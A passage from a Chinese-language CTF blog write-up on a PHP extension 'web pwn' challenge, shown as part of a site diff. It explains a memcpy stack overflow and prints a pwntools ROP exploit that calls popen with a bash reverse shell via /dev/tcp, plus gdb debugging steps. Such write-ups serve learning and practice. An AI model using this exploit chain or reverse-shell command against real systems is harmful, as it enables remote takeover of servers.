n);</span><br><span class="line">    php_printf(<span class="string">&quot;The baby phppwn.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现这个程序是有栈溢出的，memcpy对buf进行了溢出</p>
+<p>然后下一步我们就开始写脚本进行触发这个栈溢出，注意点就是不能直接拿shell，需要反弹shell，这里采用popen</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(/bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们只要找到对应的rdi和rsi传参即可，具体找法就是采用ROPbinary进行找寄存器，然后传参就可以了</p>
+<p>这里知道了漏洞，我们直接开始写脚本(由于方便本地调试，这里我们关闭本地随机化，我是在Ubuntu20环境下打的，需要用到栈对齐)</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chuangjian</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jsjsj.php&quot;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">        pf.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php </span></span><br><span class="line"><span class="string">        webpwn(urldecode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">        ?&gt;&#x27;&#x27;&#x27;</span>%urlencode(buf))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)</span><br><span class="line">libc.address =<span class="number">0x7ffff763a000</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span>+libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002601f</span>+libc.address</span><br><span class="line">popen_addr = libc.sym[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x0000000000022679</span>+libc.address</span><br><span class="line">cmd = <span class="string">&quot;/bin/bash -c \&quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1\&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">stack_base = <span class="number">0x7ffffffde000</span></span><br><span class="line">stack_offset = <span class="number">0x1c330</span></span><br><span class="line">ret=<span class="number">0x0000000000022679</span>+libc.address</span><br><span class="line">stack_addr = stack_offset+stack_base</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(ret)+p64(pop_rdi)+p64(stack_addr+<span class="number">0x88</span>+<span class="number">0x30</span>+<span class="number">0x60</span>+<span class="number">415</span>-<span class="number">23</span>)+p64(pop_rsi)+p64(stack_addr+<span class="number">0x88</span>+<span class="number">0x28</span>+<span class="number">384</span>+<span class="number">8</span>)\</span><br><span class="line">+p64(popen_addr)+ <span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+popen_addr+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+cmd.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">chuangjian(payload)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本生成php exp，然后gdb动调方法设置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb php   #动调php</span><br><span class="line">set args php_exp.php</span><br><span class="line">run  #加载到我们的webpwn库</span><br><span class="line">b zif_webpwn  #把断点下到我们写的漏洞文章</span><br><span class="line">run  #再run下就到我们的断点主函数了。进行动调就可以了</span><br></pre></td></tr></table></figure>
+
+<p>遇到的🕳：</p>
+<p>这个exp在调试中有很多曲折，呜呜呜，因为我犯了一个很低级的错误，就是ret栈对齐，栈对其之后，一直报segmentaton fault，然后动调了好久，发现自己s***了，光把ret填到前面了，后面 栈有些偏移和实际不符合导致rdi和rsi没传进去，然后细调了下就可以了，其实这个地方是个很低级的错误，没办法👴还是菜</p>
+<h2 id="总结：通过本篇webpwn能入门php-web-pwn-知道了比赛中的web-pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题-是真有意思，经典名言：NO-PWN-Rev-NO-FUN！！！！"><a href="#总结：通过本篇webpwn能入门php-web-pwn-知道了比赛中的web-pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题-是真有意思，经典名言：NO-PWN-Rev-NO-FUN！！！！" class="headerlink" title="总结：通过本篇webpwn能入门php(web)pwn,知道了比赛中的web pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题 是真有意思，经典名言：NO PWN(Rev) NO FUN！！！！"></a>总结：通过本篇webpwn能入门php(web)pwn,知道了比赛中的web pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题 是真有意思，经典名言：NO PWN(Rev) NO FUN！！！！</h2>
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Mr. Jsjsj, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/pwn/" class="tag">#pwn</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2022/10/03/2022%E5%AE%89%E6%B4%B5%E6%9D%AF%20CTF%20PWN%20wp/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">2022安洵杯 CTF PWN wp</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2022/10/03/2022%20Strong%20Network%20Mimic%20CTF%20PWN%20writeup/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">2022 Strong Network Mimic CTF PWN writeup</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="MrWillCom/MrWillCom.github.io" data-repo-id="MDEwOlJlcG9zaXRvcnkyODg5NTc5MTA=" data-category="Announcements" data-category-id="DIC_kwDOETkl1s4COQZm" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/jsjsj1" class="item">GitHub</a>
+                
+                <a href="904815041@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Mr. Jsjsj<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+         
+        
+<script src="//code.tidio.co/6bkvqlfpdbtihnufei8yxpsvf98bq5gv.js"></script>
+ 
+        
+<script src="/js/tidio.js"></script>
+
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
